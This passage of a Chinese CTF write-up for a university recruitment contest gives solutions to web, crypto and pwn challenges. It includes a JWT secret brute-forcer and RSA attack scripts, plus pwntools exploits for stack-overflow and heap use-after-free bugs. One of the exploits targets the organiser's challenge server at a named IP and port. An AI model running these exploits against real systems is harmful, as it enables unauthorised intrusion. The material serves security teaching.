+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#jwt爆破</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">ans = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEifQ.CpgQJykDiFdnjOkVDrX8EgtMRzsq5dMjT7AOiQyXoVw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\Desktop\web\\rockyou\\rockyou.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        hack = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;,key=line.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&quot;&quot;</span>),algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> hack == ans:</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#md5爆破</span></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSRUVWXYZ1234567890&quot;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;y0u_Are_rE4ll_Jwt_&quot;</span></span><br><span class="line">ans = <span class="string">&quot;444ceddca7c2baed444e8b53aab89c06&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">flag,num</span>):</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">0</span>):</span><br><span class="line">        flag = flag+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(flag.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        <span class="keyword">if</span>(value == ans):</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            find(flag+i,num-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find(flag,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里md5爆破写的是递归搜索算法，感兴趣的同学可以看一下</p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><p>第一层是base64，解出来明显是个凯撒，尝试后发现不是一般的凯撒，分析得到是移位凯撒</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(<span class="string">&quot;a3Job3tmb3dvYmF0amZ1dG59==&quot;</span>))</span><br><span class="line"></span><br><span class="line">ans1 = <span class="string">&quot;krho&#123;fowobatjfutn&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">che, value</span>):</span><br><span class="line">    che = <span class="built_in">ord</span>(che) - value</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(che) &lt; <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">        che+=<span class="number">26</span></span><br><span class="line">    che = <span class="built_in">chr</span>(che)</span><br><span class="line">    <span class="keyword">return</span> che</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bru</span>(<span class="params">string,key</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&#x27;&#123;_&#125;&#x27;</span>:</span><br><span class="line">            ans += i</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans = ans + sub(i,cnt+key)</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">            cnt%=<span class="number">26</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        flag = bru(ans1,i)</span><br><span class="line">        <span class="built_in">print</span>(flag,<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="hill圣殿"><a href="#hill圣殿" class="headerlink" title="hill圣殿"></a>hill圣殿</h2><p>题目中提到hill，指的是希尔密码，密钥是题目描述中出现的数字 1 3 4 7</p>
+<p>网上找一个在线解密器</p>
+<p><img src="/../images/c1.png" alt="c1"></p>
+<p>包上flag头之后 njustCTF{EASYHILLCIPHER}</p>
+<h2 id="fense神庙"><a href="#fense神庙" class="headerlink" title="fense神庙"></a>fense神庙</h2><p>看着像是base64解密，但是用在线网站解密无法解出</p>
+<p>根据题目描述，是W型栅栏密码</p>
+<p>栏数不清楚，但通过密文中&#x3D;在最后面，也就是说&#x3D;的位置是栅栏的右下角，并且密文长度为52，符合这种长度要求的只有栏数&#x3D;2、4、18时，猜测栏数应该是4。</p>
+<p>在线工具中解密</p>
+<p><img src="/../images/c2.png" alt="c2"></p>
+<p>再进行base64解码</p>
+<p><img src="/../images/c3.png" alt="c3"></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;the__r1gh7__f1ag__1s__hErE!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="小BOSS-KM"><a href="#小BOSS-KM" class="headerlink" title="小BOSS-KM"></a>小BOSS-KM</h2><p>题目描述：King of vigenere is knowmeaning,  he’s 58 years old and likes to use his own name as the key.</p>
+<p>cipher:3kGZmge6aGYo4arAfWWeR6TwuWk9Z4KUDo2nupTCkQuzDJk</p>
+<p>不妨先扔进cyberchef里看看是不是什么编码</p>
+<p><img src="/../images/c4.png" alt="c4"></p>
+<p>描述中58岁也提示了是base58编码。</p>
+<p>解码之后格式已经很像flag了，但是应该又经过了变换。</p>
+<p>描述中提到了vigenere，这提示了维吉尼亚密码。</p>
+<p>密钥是knowmeaning</p>
+<p><img src="/../images/c5.png" alt="c5"></p>
+<p>明文前8个字符是njustCTF,可以很容易发现，应该是凯撒密码，偏移量为1，描述中的king也提示了这点。</p>
+<p>凯撒密码解密一下</p>
+<p>得到flag  ：njustCTF{Kn0wMe4n1ng_1s_Re_kkk1ng}</p>
+<h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RSA的公钥分别为</span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">n = <span class="number">1031213071504542754992707293999160076445384448298953587005522161125600870821289</span></span><br><span class="line"></span><br><span class="line">密文为</span><br><span class="line">c = <span class="number">437258512230197702954697692900649647064442916413256849535116521904443084382643</span></span><br></pre></td></tr></table></figure>
+
+<p>使用yafu分解n</p>
+<p>可能需要分解一段时间，n越大,yafu分解越困难，首次分解估计需要90s。</p>
+<p><img src="/../images/c8.png" alt="c8"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">1336498645162390524553435713863781091889</span></span><br><span class="line">q = <span class="number">771578089687659791285751998117883364601</span></span><br><span class="line">n = <span class="number">1031213071504542754992707293999160076445384448298953587005522161125600870821289</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">437258512230197702954697692900649647064442916413256849535116521904443084382643</span></span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag: njustCTF{y4fu_c4n_s0lv4_this}</p>
+<h2 id="normalRSA"><a href="#normalRSA" class="headerlink" title="normalRSA"></a>normalRSA</h2><p>共模攻击</p>
+<p><img src="/../images/c9.png" alt="c9"></p>
+<p>解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c1= <span class="number">13711466271621097636824474979768177787028612329079285967637259776570794642088942788975126959984079270587708748583512772036524204812424180723293328154910862174781249563401200813372280140414019669019624537445547420142148295824339385674709615857474189589062879043689820482450749239240217040082995788813158373528237594354457213919694510007051458531527994737467777318304355557390347242474561117387509553980179747317999610730309441569884290706928043607340170654157593843562512009585750886227248174079991468567471899713542427491889309362029356905376979426668385689750918766774642435093323040630362101712250446067828445573339</span></span><br><span class="line">c2= <span class="number">7333764142878461617441559138973743681497798460836723313299310199165540216977464768948155892364593564474054498361630994769388311041430188556346135045441749807606863820379345364690864727770755698171372966007213017151238443707427589871646412865142173143856341308283414498743780577381179466116123839577137153148859347403214934411944861773005665272058876021329770334176458684683708565213354840253900104774666519584463892667695726190453527323470330661203317576996608348024593033964595179749385046491169408271028612866167430881563978385745842535148322322425570069125910401111468864250829064744462508009264689927722695753515</span></span><br><span class="line">n= <span class="number">25163055291461014894793511607654151388685364351064395512591933297709308732835154483381016457116109922714102475566197648739439400497971809207918035228889266005750994177213279207936812904029706977845804997362849307206916653409599155552989503927945286216700474071091979932052280630924756182300772568188694661706329683597641511600787290800035273990396524937991722339945393434419015362574264373532928632897399141928618741982809958753036766248840183982164946613887539804174659977179427891444828624160934866892365774381344431309966545370877484373571738808824594869896009944130836451360769468653069947722331684762847598492901</span></span><br><span class="line">e1 = <span class="number">823410031</span></span><br><span class="line">e2 = <span class="number">737326981</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">y = gcdext(e1, e2)</span><br><span class="line">s = y[<span class="number">1</span>]</span><br><span class="line">t = y[<span class="number">2</span>]</span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s, n) * <span class="built_in">pow</span>(c2, t, n)) % n</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:  njustCTF{Our_l0v3ly_b05s__5xyuga0!!!}</p>
+<h2 id="Broken-RSA"><a href="#Broken-RSA" class="headerlink" title="Broken RSA"></a>Broken RSA</h2><p>虽然 n 不是完全的，不存在低 233 位，但是p q非常相近，可以认为近似相等，直接对 n &lt;&lt; 233 进行开方然后在附近寻找素数即可</p>
+<p>出题人的代码写的非常不优雅，将就着看就行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">6266037346946993933689577508838698652874931697391174880289781046569860558909060386308033061292964062011133702713490642417557143807550984709901154086151963937973167519314475814096357909358705621973174409176758130879938994466131630594283911</span></span><br><span class="line">c = <span class="number">29401304058834808252861342611399675035204925015868792171794257570311947263909374251515011328605141954123014541509932841450288091092236126688012984351426433285204298098619845517410077641239945845872375798928845305016081056092259857549220091536276557106297363332613459364455047891356023068202600596018407229985</span></span><br><span class="line">n_part = n</span><br><span class="line">n = n &lt;&lt; <span class="number">233</span></span><br><span class="line">p = next_prime(<span class="built_in">int</span>(n ** <span class="number">0.5</span>) - (<span class="number">1</span> &lt;&lt; <span class="number">500</span>))</span><br><span class="line">step = <span class="number">512</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="keyword">while</span> ((p * next_prime(p)) &gt;&gt; <span class="number">233</span> &lt; n_part):</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> ((tmp * next_prime(tmp)) &gt;&gt; <span class="number">233</span> &lt;= n_part):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;_:&quot;</span>, n_part)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;n:&quot;</span>, (tmp * next_prime(tmp)) &gt;&gt; <span class="number">233</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tmp:&quot;</span>, tmp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        p = tmp</span><br><span class="line">        tmp = next_prime(tmp + (<span class="number">1</span> &lt;&lt; step))</span><br><span class="line">    step -= <span class="number">1</span></span><br><span class="line">q = next_prime(p)</span><br><span class="line">f = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, f)</span><br><span class="line">n = p * q</span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>可能因为我招新讲的不好呜呜呜，大家做PWN的积极性不是很高，其实5道PWN题目有两道是点击即送的签到题，下面是PWN方向的WP。</p>
+<p>啊对了，PWN的环境暂时都是不关的，大家可以再复现一下。(别对哥们服务器做坏事奥)</p>
+<p>IP:47.92.3.18<br>PORT: 60001~60005</p>
+<h2 id="BIGBIGNUM"><a href="#BIGBIGNUM" class="headerlink" title="BIGBIGNUM"></a>BIGBIGNUM</h2><p>这道题目是整数溢出，下面是题目的源代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">secret_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;下面我们来玩猜数字的游戏吧，如果我没猜到你想的数字就给你flag\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你的数字(给我一个正整数哦O.o)：&quot;</span>);</span><br><span class="line">    <span class="type">char</span> *input_number = <span class="built_in">malloc</span>(<span class="number">256</span> * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%255s&quot;</span>, input_number);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> number;</span><br><span class="line">    <span class="type">int</span> i = atoi(input_number);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> h = i;</span><br><span class="line">    <span class="keyword">if</span> (h &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;唔.....我想想啊，这个数字是不是%s?\n&quot;</span>, input_number);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;嘿嘿，我猜对了吧，快点再运行一次，我还想玩！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    number = i;</span><br><span class="line">    <span class="keyword">if</span> (number != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;唔.....我想想啊，这个数字是不是%s?\n&quot;</span>,input_number);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;嘿嘿，我猜对了吧，快点再运行一次，我还想玩！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((input_number != <span class="number">0</span>) &amp; (i &lt; <span class="number">0</span> || number == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;啊，我猜不到了，flag给你喽\n&quot;</span>);</span><br><span class="line">        secret_shell();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到number是unsigned short，但是i是int，这样赋值的时候会取最后低两个字节，如果你输入65536，如下图(DEC是十进制，HEX是十六进制)</p>
+<p><img src="/../images/image-20231016124135029.png" alt="image-20231016124135029"></p>
+<p>这个时候number&#x3D;0 ，i&#x3D;input_num，前两个if中的判断就是false然而第三个if就是true。进入shell</p>
+<p><img src="/../images/image-20231016124142509.png" alt="image-20231016124142509"></p>
+<p>整数溢出可以看这样图理解一下，如果大于这个类型的最大数就会进入一个循环(可以自己通过c语言编写尝试一下)</p>
+<p>详细解释：<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/">https://ctf-wiki.org/pwn/linux/user-mode/integeroverflow/introduction/</a></p>
+<p><img src="/../images/image-20231016124202406.png" alt="image-20231016124202406"> </p>
+<h2 id="DMC-ESREVER"><a href="#DMC-ESREVER" class="headerlink" title="DMC_ESREVER"></a>DMC_ESREVER</h2><p>这个题目顾名思义，就是将输入的命令翻转过来。</p>
+<p><img src="/../images/image-20231016124210574.png" alt="image-20231016124210574"></p>
+<p>通过报错我们可以发现，这个程序就是将我们输入的字符串倒转再通过system()函数执行，比如我们输入123，系统就会执行system(321),产生报错。</p>
+<p>通过输入sl(ls) 判断有无flag，然后输入galf tac(cat flag)获取flag</p>
+<p><img src="/../images/image-20231016124236912.png" alt="image-20231016124236912"></p>
+<h2 id="Easystack"><a href="#Easystack" class="headerlink" title="Easystack"></a>Easystack</h2><p>对不起~~这道题原本附件上错了，上了一个保护全开的了。</p>
+<p><strong>这道题有两种解法，下面听我娓娓道来：</strong></p>
+<h3 id="常规栈溢出"><a href="#常规栈溢出" class="headerlink" title="常规栈溢出"></a>常规栈溢出</h3><p>这个就是和我招新讲的一样，具体可以看我的ppt。我们可以通过ida发现gets函数，并且栈上空间是0x8C。</p>
+<p><img src="/../images/image-20231016124253019.png" alt="image-20231016124253019"></p>
+<p>并且我们通过翻看ida可以找到后门函数的地址0x080492BA,也就是我们目标的返回地址。</p>
+<p><img src="/../images/image-20231016124306959.png" alt="image-20231016124306959"></p>
+<p><img src="/../images/image-20231016124313719.png" alt="image-20231016124313719"></p>
+<p>栈上结构如上图所示</p>
+<p>因此就可以写出脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> <span class="comment"># 引入库函数 pwntools</span></span><br><span class="line">p = process(<span class="string">&quot;./easystack&quot;</span>) <span class="comment"># 这个是本地做</span></span><br><span class="line">ret_addr = <span class="number">0x080492BA</span> <span class="comment"># 找到后门函数地址作为返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8C</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x4</span> + p32(ret_addr) <span class="comment"># 设置攻击载荷</span></span><br><span class="line">p.send(payload) <span class="comment"># 发送 这里的p就是第二行的p</span></span><br><span class="line">p.interactive() <span class="comment"># 交互</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231016124320893.png" alt="image-20231016124320893"> </p>
+<h3 id="栈溢出覆盖栈上变量"><a href="#栈溢出覆盖栈上变量" class="headerlink" title="栈溢出覆盖栈上变量"></a>栈溢出覆盖栈上变量</h3><p>栈上布局如下所示</p>
+<p><img src="/../images/image-20231016124327158.png" alt="image-20231016124327158"></p>
+<p>需要128个字节填充s[128]接下来修改v2，注意v2是一个int型，虽然只需要1953这么大，但是还是需要p32()打包。</p>
+<p><img src="/../images/image-20231016124332732.png" alt="image-20231016124332732"></p>
+<h2 id="EasyHeap"><a href="#EasyHeap" class="headerlink" title="EasyHeap"></a>EasyHeap</h2><p>(听说需要防AK)所以就塞了一道堆题在里面，对新生不太友好，可能主要是面向大二的同学了。</p>
+<p>最基础的UAF，我放一个我的堆笔记和ctfviki，就不展开了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/teamoever/um3rb9/pf14m9?singleDoc#">https://www.yuque.com/teamoever/um3rb9/pf14m9?singleDoc#</a> 《堆的课堂基础知识点》</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/teamoever/um3rb9/vaycbh?singleDoc#">https://www.yuque.com/teamoever/um3rb9/vaycbh?singleDoc#</a> 《堆的基础漏洞》</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/</a></p>
+<p>下面是脚本：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;47.92.3.18&#x27;</span>, <span class="number">60003</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">shell_addr = <span class="number">0x8048945</span></span><br><span class="line">add(<span class="number">48</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>, p32(shell_addr))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231016124341060.png" alt="image-20231016124341060"> </p>
+<h2 id="StrangeGift"><a href="#StrangeGift" class="headerlink" title="StrangeGift"></a>StrangeGift</h2><p>这道题目是ret2shellcode，应该是栈溢出的下一个学到的知识。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode</a></p>
+<p><img src="/../images/image-20231016124347555.png" alt="image-20231016124347555"> </p>
+<p>题目保护全关，开启了栈上可执行。</p>
+<p><img src="/../images/image-20231016124357543.png" alt="image-20231016124357543"> </p>
+<p>运行一下看看打印了一串地址。</p>
+<p><img src="/../images/image-20231016124404020.png" alt="image-20231016124404020"> </p>
+<p>通过ida可以知道，这道题目存在栈溢出，没有后门函数，但是打印了栈上的地址，所以我们应该怎么做呢？</p>
+<p><img src="/../images/image-20231016124414020.png" alt="image-20231016124414020"> </p>
+<p>还记得返回地址用来告诉程序下一条指令的地址吗？所以我们如果在栈上写入shellcode并且将返回地址指向刚刚打印的栈上的起始地址，是不是就可以执行栈上的shellcode了。</p>
+<p>因此写下WP</p>
